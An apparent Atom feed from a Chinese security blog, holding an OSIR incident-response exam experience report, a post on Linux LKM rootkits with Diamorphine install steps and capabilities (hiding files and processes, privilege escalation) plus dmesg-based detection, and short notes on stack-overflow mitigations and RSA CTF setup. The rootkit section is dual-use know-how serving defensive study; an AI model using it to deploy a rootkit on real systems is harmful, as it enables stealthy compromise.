<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>M0rk&#39;s Blog</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://kevien.github.io/"/>
  <updated>2025-04-06T09:04:41.689Z</updated>
  <id>http://kevien.github.io/</id>
  
  <author>
    <name>M0rk</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>OffSec蓝队课程IR-200及OSIR考证之旅</title>
    <link href="http://kevien.github.io/2025/04/06/OffSec%E8%93%9D%E9%98%9F%E8%AF%BE%E7%A8%8BIR-200%E5%8F%8AOSIR%E8%80%83%E8%AF%81%E4%B9%8B%E6%97%85/"/>
    <id>http://kevien.github.io/2025/04/06/OffSec蓝队课程IR-200及OSIR考证之旅/</id>
    <published>2025-04-06T08:56:41.000Z</published>
    <updated>2025-04-06T09:04:41.689Z</updated>
    
    <content type="html"><![CDATA[<h2 id="TL；DR"><a href="#TL；DR" class="headerlink" title="TL；DR"></a>TL；DR</h2><p><img src="/2025/04/06/OffSec蓝队课程IR-200及OSIR考证之旅/image-3.png" alt="alt text"></p>
<ul>
<li>近期参加了OffSec蓝队方向应急响应相关的学习课程IR-200，以及参加了OSIR认证并获取了证书，在整个过程中感觉还是学到了很多应急方面的知识技能，简单总结一下这次的OSIR学习和考证之旅供大家参考。</li>
<li>因为这个认证课程是在24年10月份左右推出，不像网上一些其它课程参考资料和经验文章那么多，OSIR认证相关的文章网上基本上没有，国外目前有这个证书的人不多，国内估计更少，所以能获取的外界帮助几乎没有，又因为这次是第一次参加OffSec的学习和认证，必然是一场艰难的踏冰之旅。<h2 id="IR-200学习"><a href="#IR-200学习" class="headerlink" title="IR-200学习"></a>IR-200学习</h2></li>
<li>购买课程之后可以获取官方教材在线查看或者离线下载到本地进行查看，一共372页，包含以下的章节。<br><img src="/2025/04/06/OffSec蓝队课程IR-200及OSIR考证之旅/image.png" alt="alt text"></li>
<li>在拿到官方学习教材之后查看了大纲之后按顺序进行了学习，其中有些英文等都不太懂，这个时候可以下载一些辅助工具(比如谷歌的沉浸式翻译插件)来进行翻译，大大提升了学习效率。前面几个章节主要是理论概念知识的学习。比如安全事件的管理流程(这个课程主要遵循的是NIST标准)<br><img src="/2025/04/06/OffSec蓝队课程IR-200及OSIR考证之旅/image-1.png" alt="alt text"><br>还比如应急响应沟通的重要性及一些规范<br><img src="/2025/04/06/OffSec蓝队课程IR-200及OSIR考证之旅/image-2.png" alt="alt text"></li>
<li>在介绍这些理论概念的时候也会结合具体的实际案例让学习者更加清楚直观的去感受。其中第六章和第八章是考试的重点，学习到的工具有<strong>splunk、autospy、procmon、tcpview、volaitlity、pestudio、RSA NetWitness、IRIS、response kit</strong>等。其中有些之前接触过，有些没接触过学下来之后增加了自己对事件响应的了解以及一些新领域的学习。尤其是取证这块儿(离线成像、在线成像、远程成像、虚拟机成像)，国内对这块儿做的比较少。当然在第六、八章节中会有几个在线实验环境，需要使用vpn连接进行学习，国内直连有问题浪费了一些时间，但可以看出课程开发人员还是花费了心思。尤其是使用<strong>splunk做日志关联分析</strong>，国内大部分的应急响应都是基于单机、跨机器或者日志不完整，很多时候也没有这样的机会去实践，所以说我觉得这个才整个课程的一大亮点，并且随着未来各个中小公司普及使用SIEM，必然需要大量具备这样技能的人才。</li>
</ul>
<ul>
<li><p>剩下就是遏制、根除、恢复和跟踪总结阶段的工作内容、事件管理、报告编写等内容，也能学到不少干货。其中比如在事件管理协同平台<strong>IRIS</strong>，这款工具是开源的，<a href="https://github.com/dfir-iris/iris-web" target="_blank" rel="noopener">IRIS地址</a>，国内中大型的公司可以考虑使用这个工具进行事件管理和协同。提升安全事件管理效率。</p>
<h2 id="关于考试"><a href="#关于考试" class="headerlink" title="关于考试"></a>关于考试</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">考试主要要求</span><br><span class="line">1.远程考试,需要开启摄像头和屏幕共享</span><br><span class="line">2.考试时长8h，考试满分70 50分为通过 考试涉及到两个场景 场景1 四个问题 一个问题10分，场景2 两个问题 一个问题15分</span><br><span class="line">3.考试完成需要24小时内提交英文报告(有模版可以参考)</span><br><span class="line">4.考试基本开卷，可以查询本地资料或者使用谷歌搜索但不能使用AI类工具(如chatgpt、deepseek等)</span><br></pre></td></tr></table></figure>
</li>
<li><p>目前官方只有一套challenge lab（相对较少），但其实对考试参考意义比较大，而且在第一次独立打完这个lab的时候发现自己花了好长时间，因为我目前的理解是教材是基础，想要通过考试只学习教材是不够的，还需要去分析更多的事件场景以及了解更多关于样本分析的案例及实践。</p>
</li>
<li>标准课程中lab的有效期(包括章节中涉及的lab)默认有效期是90天，而且一旦开始不能中途暂停，所以最好在3个月内完成考试，否则想要进行实操环境练习就需要进行lab的再次购买。个人感觉如果基础一般且日常工作中没怎么用过SIEM事件分析的学习者只是学习官方教材以及lab，很难一次性通过。</li>
<li>此外考试还有30分值的<strong>样本提取和分析</strong>，考察点有windows和linux的日志、恶意软件的行为分析等，最后一个样本分析中略带ctf的味道(目前还未涉及到使用IDA进行分析，后面可能高级课程如IR-300会有)。</li>
<li>整体来说如果以上实操比较少而且考试时间相对较短8小时，通过的难度还是有些大。</li>
<li>在整个学习过程中如果有任何问题和建议大家可以去官方discord IR-200频道沟通交流(包括课程章节和lab部分)，里面会有助教进行答疑。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">具体考试过程和注意事项：</span><br><span class="line">考试过程：</span><br><span class="line">1.线上预约(目前这个考试的预约人数应该不多，一般提前两三天即可)选白天或者自己状态最好的时间段。</span><br><span class="line">2.考官提前15分钟上线检查环境，需要检查英文证件(护照)、开启摄像头、开启屏幕共享(安装浏览器插件).考试中自己的屏幕拓展一开始有问题,后面切换到firefox浏览器正常了,花费了四十多分钟的时间.</span><br><span class="line">3.考试 考试开始后阅读题目要求和注意事项-&gt;下载vpn配置文件并连接-&gt;根据题目要求找到关键线索并提交答案，当然在这个过程中需要边做边截图，否则后面时间可能不够用，因为考试一旦结束即不能进行环境的访问影响报告的编写。中途如果卡壳可以申请休息一下，在休息期间可以进行反思看是否有遗漏的地方往往会有很好的效果。准备休息和休息回来的时候跟监考老师打个招呼但不用等他回复。考试中间如果遇到有网络问题可以和监考老师及时反馈。</span><br><span class="line">4.考试结束 经过8h的奋战(刨除检查以及中途休息等因素大概6个小时)后需要24h内提交英文版报告，报告中涉及到完整的事件发现、线索追踪、事件遏制、事件根除等方面，而且需要提供完整的截图。</span><br><span class="line">5.报告提交后 一般10个工作日之内会有邮件通知通过与否(并不公布具体分数)，顺利的话一般1-2个工作日，卡及格线通过可能需要久些。</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="学习收获及证书作用及就业"><a href="#学习收获及证书作用及就业" class="headerlink" title="学习收获及证书作用及就业"></a>学习收获及证书作用及就业</h2><ul>
<li><strong>首先通过系统性的学习能收获完整的网络安全应急响应方向知识，让自己具有更广阔的视野。</strong></li>
<li><strong>应急实战能力的提升</strong></li>
<li><strong>报告能力的提升</strong></li>
<li><strong>英文能力的提升</strong></li>
<li>证书作用及就业：目前国内外网络安全领域对蓝队相关工作岗位需求还是比较大，尤其是具有丰富实战经验的人员，如果能啃下这个证书，那么你可以应付国内大部分蓝队的工作，比如<strong>安全监控、事件研判分析、应急响应项目经理、安全运营工程师</strong>等，此外有了这个证书对于寻求一些外企工作岗位也很有帮助。<h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2></li>
<li><p>国内访问lab会有问题可以本机使用aws的vps或者在路由器上做代理(我一直用的后者比较丝滑),另外考试没有必须要求在kali虚拟机上连接vpn进行操作，我考试的时候就是用的mac openvpn进行连接，但要做好路由转发 如</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo route -n add -net 192.168.195.132/24 -interface utun4</span><br></pre></td></tr></table></figure>
</li>
<li><p>最好有拓展屏幕，而且是<strong>竖屏显示的拓展屏</strong>，因为日志分析的时候观看更方便舒适，截图更完整。</p>
</li>
<li><strong>寻找队友 组队考证交流+一起报名享优惠 微信 </strong>TXJfTTByaw==<strong>,要求有一定的红队或蓝队基础及经验。</strong><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2></li>
<li><a href="https://manage.offsec.com/app/uploads/2024/10/IR-200_-Foundational-Incident-Response-Syllabus-final.pdf" target="_blank" rel="noopener">课程大纲</a></li>
<li><a href="https://www.offsec.com/report-templates/OSIR-Exam-Report.docx" target="_blank" rel="noopener">报告模版</a></li>
<li><a href="https://help.offsec.com/hc/en-us/articles/30960007786900-OSIR-Exam-Guide" target="_blank" rel="noopener">OSIR考试指南</a></li>
<li><a href="https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon" target="_blank" rel="noopener">sysmon 常见事件id</a></li>
<li><a href="https://github.com/Psmths/windows-forensic-artifacts" target="_blank" rel="noopener">windows取证证据</a></li>
<li><a href="https://medium.com/@araman99/uncovering-windows-forensics-artefacts-for-digital-forensics-investigators-e0b75f01d086" target="_blank" rel="noopener">Uncovering Windows Forensics Artefacts for Digital Forensics Investigators</a></li>
<li><a href="https://bots.splunk.com/" target="_blank" rel="noopener">splunk 靶场</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;TL；DR&quot;&gt;&lt;a href=&quot;#TL；DR&quot; class=&quot;headerlink&quot; title=&quot;TL；DR&quot;&gt;&lt;/a&gt;TL；DR&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/2025/04/06/OffSec蓝队课程IR-200及OSIR考证之旅/image-3.pn
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Linux LKM Rootkit简介与排查</title>
    <link href="http://kevien.github.io/2024/08/07/Linux-LKM-Rootkit%E7%AE%80%E4%BB%8B%E4%B8%8E%E6%8E%92%E6%9F%A5/"/>
    <id>http://kevien.github.io/2024/08/07/Linux-LKM-Rootkit简介与排查/</id>
    <published>2024-08-07T13:38:03.000Z</published>
    <updated>2025-04-12T09:15:29.949Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2024/08/07/Linux-LKM-Rootkit简介与排查/1.png" alt=""><br><a href="https://xz.aliyun.com/t/14548" target="_blank" rel="noopener">https://xz.aliyun.com/t/14548</a> （记录某次”有趣的”挖矿木马排查），这篇关于应急的文章写的不错，排查点基本上都排查到了，感觉就是差了个在入侵时间点范围内被修改过的文件这个角度去排查，但瑕不掩瑜，整个文章的亮点还是比较多，尤其是LKM的发现，之前没对LKM什么了解，遂简单学习了下。</p>
<p>Loadable Kernel Modules (LKMs) 是现代操作系统内核（如 Linux 内核）中的一个重要特性。它们允许在运行时动态加载和卸载内核功能，而无需重新编译或重启内核。以下是对 LKMs 的详细介绍。</p>
<h3 id="什么是-Loadable-Kernel-Modules-LKMs"><a href="#什么是-Loadable-Kernel-Modules-LKMs" class="headerlink" title="什么是 Loadable Kernel Modules (LKMs)?"></a>什么是 Loadable Kernel Modules (LKMs)?</h3><p>Loadable Kernel Modules 是一段可以在内核运行时动态加载或卸载的代码。它们通常用于扩展内核的功能，例如添加新的设备驱动程序、文件系统支持或网络协议。</p>
<h3 id="LKMs-的优点"><a href="#LKMs-的优点" class="headerlink" title="LKMs 的优点"></a>LKMs 的优点</h3><ol>
<li><strong>灵活性</strong>: 允许在不重启系统的情况下添加或移除内核功能。</li>
<li><strong>开发便利</strong>: 开发和测试内核模块更为简便，因为不需要每次修改后都重启系统。</li>
<li><strong>资源管理</strong>: 只在需要时加载模块，有助于节省系统资源。</li>
<li><strong>安全性</strong>: 可以动态卸载存在漏洞的模块，减少安全风险。</li>
</ol>
<h3 id="常见的-LKM-类型"><a href="#常见的-LKM-类型" class="headerlink" title="常见的 LKM 类型"></a>常见的 LKM 类型</h3><ol>
<li><strong>设备驱动程序</strong>: 用于支持新硬件设备。</li>
<li><strong>文件系统</strong>: 添加对新的文件系统类型的支持。</li>
<li><strong>网络协议</strong>: 支持新的网络协议或增强现有协议的功能。</li>
<li><strong>系统调用</strong>: 添加或修改系统调用。</li>
</ol>
<h3 id="LKM-的基本操作"><a href="#LKM-的基本操作" class="headerlink" title="LKM 的基本操作"></a>LKM 的基本操作</h3><h4 id="加载模块"><a href="#加载模块" class="headerlink" title="加载模块"></a>加载模块</h4><p>使用 <code>insmod</code> 命令可以加载一个模块：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo insmod mymodule.ko</span><br></pre></td></tr></table></figure>
<p><code>mymodule.ko</code> 是你要加载的模块文件。</p>
<h4 id="卸载模块"><a href="#卸载模块" class="headerlink" title="卸载模块"></a>卸载模块</h4><p>使用 <code>rmmod</code> 命令可以卸载一个模块：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo rmmod mymodule</span><br></pre></td></tr></table></figure>
<p><code>mymodule</code> 是你要卸载的模块名称。</p>
<h4 id="查看已加载模块"><a href="#查看已加载模块" class="headerlink" title="查看已加载模块"></a>查看已加载模块</h4><p>使用 <code>lsmod</code> 命令可以查看当前加载的所有模块：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsmod</span><br></pre></td></tr></table></figure>
<h4 id="模块信息"><a href="#模块信息" class="headerlink" title="模块信息"></a>模块信息</h4><p>使用 <code>modinfo</code> 命令可以查看模块的详细信息：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">modinfo mymodule.ko</span><br></pre></td></tr></table></figure>
<h3 id="编写一个简单的-LKM"><a href="#编写一个简单的-LKM" class="headerlink" title="编写一个简单的 LKM"></a>编写一个简单的 LKM</h3><p>以下是一个简单的 “Hello World” 内核模块示例。</p>
<h4 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h4><p>创建一个名为 <code>hello.c</code> 的文件，内容如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">"GPL"</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">"Your Name"</span>);</span><br><span class="line">MODULE_DESCRIPTION(<span class="string">"A simple Hello World LKM"</span>);</span><br><span class="line">MODULE_VERSION(<span class="string">"0.1"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __<span class="function">init <span class="title">hello_init</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">"Hello, World!\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __<span class="function"><span class="built_in">exit</span> <span class="title">hello_exit</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">"Goodbye, World!\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(hello_init);</span><br><span class="line">module_exit(hello_exit);</span><br></pre></td></tr></table></figure>
<h4 id="编译模块"><a href="#编译模块" class="headerlink" title="编译模块"></a>编译模块</h4><p>创建一个名为 <code>Makefile</code> 的文件，内容如下：</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">obj-m += hello.o</span><br><span class="line"></span><br><span class="line"><span class="section">all:</span></span><br><span class="line">    make -C /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">    make -C /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build M=<span class="variable">$(PWD)</span> clean</span><br></pre></td></tr></table></figure>
<p>然后运行以下命令编译模块：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make</span><br></pre></td></tr></table></figure>
<p>编译成功后会生成一个 <code>hello.ko</code> 文件。</p>
<h4 id="加载和卸载模块"><a href="#加载和卸载模块" class="headerlink" title="加载和卸载模块"></a>加载和卸载模块</h4><p>加载模块：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo insmod hello.ko</span><br></pre></td></tr></table></figure>
<p>查看内核日志以确认模块加载成功：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dmesg | tail</span><br></pre></td></tr></table></figure>
<p>卸载模块：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo rmmod hello</span><br></pre></td></tr></table></figure>
<p>再次查看内核日志以确认模块卸载成功：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dmesg | tail</span><br></pre></td></tr></table></figure>
<p><img src="/2024/08/07/Linux-LKM-Rootkit简介与排查/1.5.jpg" alt=""></p>
<h3 id="Diamorphine"><a href="#Diamorphine" class="headerlink" title="Diamorphine"></a>Diamorphine</h3><p>*　Diamorphine 是一个 Linux 下的 LKM（Loadable Kernel Module，内核模块）rootkit，主要用于隐藏进程、文件、端口等，常被用于渗透测试或红队行动中。但因为它具有极高的隐蔽性和危害性，也常被黑客用于恶意目的。</p>
<ul>
<li>项目地址 <a href="https://github.com/m0nad/Diamorphine" target="_blank" rel="noopener">https://github.com/m0nad/Diamorphine</a></li>
<li>主要功能 1.隐藏文件 2.隐藏进程 3.隐藏自身内核模块 4.隐藏端口（可选）</li>
<li>前提条件：需要root权限、有相应的一些工具 如make、内核版本支持</li>
<li>安装：下载完源码 直接make 然后 insmod diamorphine.ko 即可。<h4 id="隐藏文件"><a href="#隐藏文件" class="headerlink" title="隐藏文件"></a>隐藏文件</h4></li>
<li>修改源码文件，替换成你想要隐藏的文件或者文件夹前缀<br><img src="/2024/08/07/Linux-LKM-Rootkit简介与排查/8c12629cc999b2f5b178043034b2f3e.png" alt="alt text"><br><img src="/2024/08/07/Linux-LKM-Rootkit简介与排查/8f699e4205d4fe15befeb65d32974cc.png" alt="alt text"><h4 id="隐藏进程"><a href="#隐藏进程" class="headerlink" title="隐藏进程"></a>隐藏进程</h4></li>
<li>使用kill 命令加 相应的信号编号实现相关的功能。<br><img src="/2024/08/07/Linux-LKM-Rootkit简介与排查/1edede0025d0112fffca7da2de217c3.png" alt="alt text"><h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><img src="/2024/08/07/Linux-LKM-Rootkit简介与排查/07b05a522ca0de59b43f69779f31084.png" alt="alt text"><h4 id="隐藏自身模块"><a href="#隐藏自身模块" class="headerlink" title="隐藏自身模块"></a>隐藏自身模块</h4><img src="/2024/08/07/Linux-LKM-Rootkit简介与排查/af4e702e23ab250cfd113d04446f7c2.png" alt="alt text"><h4 id="卸载模块-1"><a href="#卸载模块-1" class="headerlink" title="卸载模块"></a>卸载模块</h4><img src="/2024/08/07/Linux-LKM-Rootkit简介与排查/9c7484304087c8c5ca3b65efae94eaf.png" alt="alt text"></li>
</ul>
<h3 id="LKM-Rootkit-排查"><a href="#LKM-Rootkit-排查" class="headerlink" title="LKM Rootkit 排查"></a>LKM Rootkit 排查</h3><ul>
<li>使用 dmesg 命令查看内核日志，寻找可疑的加载或卸载模块的日志。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dmesg | grep module</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="/2024/08/07/Linux-LKM-Rootkit简介与排查/2.png" alt=""></p>
<ul>
<li>之后find一下相关的文件，然后上传到云沙箱上进行扫描分析<br><img src="/2024/08/07/Linux-LKM-Rootkit简介与排查/3.png" alt=""><h3 id="安全性考虑"><a href="#安全性考虑" class="headerlink" title="安全性考虑"></a>安全性考虑</h3></li>
</ul>
<p>尽管 LKMs 提供了很大的灵活性，但也带来了潜在的安全风险：</p>
<ol>
<li><strong>恶意模块</strong>: 攻击者可以加载恶意模块，获取内核级别的权限。</li>
<li><strong>稳定性</strong>: 不稳定或有缺陷的模块可能导致系统崩溃。</li>
<li><strong>签名验证</strong>: 使用模块签名验证可以确保只有经过认证的模块被加载。</li>
</ol>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>Loadable Kernel Modules 是扩展内核功能的重要工具，提供了灵活性和开发便利性。通过正确的开发和管理，可以有效地利用 LKMs 来增强系统功能，同时需要注意安全性和稳定性问题。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;/2024/08/07/Linux-LKM-Rootkit简介与排查/1.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;a href=&quot;https://xz.aliyun.com/t/14548&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;htt
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>pwn basic</title>
    <link href="http://kevien.github.io/2023/03/15/pwn-basic/"/>
    <id>http://kevien.github.io/2023/03/15/pwn-basic/</id>
    <published>2023-03-15T04:59:26.000Z</published>
    <updated>2023-03-15T05:12:49.227Z</updated>
    
    <content type="html"><![CDATA[<h4 id="栈溢出常见利用方式"><a href="#栈溢出常见利用方式" class="headerlink" title="栈溢出常见利用方式"></a>栈溢出常见利用方式</h4><h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><h3 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><h3 id="ropchain"><a href="#ropchain" class="headerlink" title="ropchain"></a>ropchain</h3><h4 id="栈溢出防护"><a href="#栈溢出防护" class="headerlink" title="栈溢出防护"></a>栈溢出防护</h4><h3 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h3><ul>
<li>CANNARY(栈保护) –金丝雀 又称为stack guard<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">金丝雀，以前矿工进入矿坑时候会带一只金丝雀下去，如果矿坑内有有毒气体，金丝雀就会鸣叫甚至死亡，同样这个canary也是缓冲区溢出攻击一种检测手段，当启用栈保护后，函数开始执行的时候会先往栈里插入cookie（金丝雀）信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="DEP"><a href="#DEP" class="headerlink" title="DEP"></a>DEP</h3><ul>
<li>NX（DEP）(数据执行保护 Data Execution Prevention)<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</span><br><span class="line">可执行的地方不能写，可写的地方不能执行</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">内存地址随机化机制（address space layout randomization)，有以下三种情况：</span><br><span class="line"></span><br><span class="line">0 - 表示关闭进程地址空间随机化</span><br><span class="line"></span><br><span class="line">1 - 表示将mmap的基址，stack和vdso页面随机化</span><br><span class="line"></span><br><span class="line">2 - 表示在1的基础上增加堆（heap）的随机化</span><br><span class="line"></span><br><span class="line">每次程序执行时，stack heap library的位置都不一样</span><br></pre></td></tr></table></figure>
<h3 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h3><ul>
<li>PIE (Position Independent Execution)<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">开启后,code与data都会跟着ALSR</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Relocation Read-Only</span><br><span class="line"></span><br><span class="line">Partial RELRO</span><br><span class="line"></span><br><span class="line">    GOT可写</span><br><span class="line"></span><br><span class="line">Full RELRO</span><br><span class="line"></span><br><span class="line">    Load time 时会将所有function resolve完毕</span><br><span class="line"></span><br><span class="line">    GOT不可写</span><br></pre></td></tr></table></figure>
<h4 id="got-hijacking"><a href="#got-hijacking" class="headerlink" title="got hijacking"></a>got hijacking</h4>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;栈溢出常见利用方式&quot;&gt;&lt;a href=&quot;#栈溢出常见利用方式&quot; class=&quot;headerlink&quot; title=&quot;栈溢出常见利用方式&quot;&gt;&lt;/a&gt;栈溢出常见利用方式&lt;/h4&gt;&lt;h3 id=&quot;ret2text&quot;&gt;&lt;a href=&quot;#ret2text&quot; class=&quot;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CTF之RSA笔记</title>
    <link href="http://kevien.github.io/2022/04/19/CTF%E4%B9%8BRSA%E7%AC%94%E8%AE%B0/"/>
    <id>http://kevien.github.io/2022/04/19/CTF之RSA笔记/</id>
    <published>2022-04-19T09:34:26.000Z</published>
    <updated>2022-06-14T10:38:35.011Z</updated>
    
    <content type="html"><![CDATA[<h3 id="sagemath"><a href="#sagemath" class="headerlink" title="sagemath"></a>sagemath</h3><ul>
<li><a href="https://www.jianshu.com/p/47ec09e870c0" target="_blank" rel="noopener">sagemath安装</a></li>
<li>有时候需要使用crypto库那么需要pip安装一下   pip install pycryptodome，注意 1.需要在sagemath shell中执行 2.可能需要fq 3.需要管理员权限执行</li>
<li>sagemath 的目录和windows的目录关系，直接看图吧<br><img src="/2022/04/19/CTF之RSA笔记/sagemath-path.png" alt=""></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;sagemath&quot;&gt;&lt;a href=&quot;#sagemath&quot; class=&quot;headerlink&quot; title=&quot;sagemath&quot;&gt;&lt;/a&gt;sagemath&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.jianshu.com/p/47ec0
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>web扫描笔记</title>
    <link href="http://kevien.github.io/2022/04/17/web%E6%89%AB%E6%8F%8F/"/>
    <id>http://kevien.github.io/2022/04/17/web扫描/</id>
    <published>2022-04-17T11:49:39.000Z</published>
    <updated>2022-04-17T12:05:34.644Z</updated>
    
    <content type="html"><![CDATA[<h3 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h3><ul>
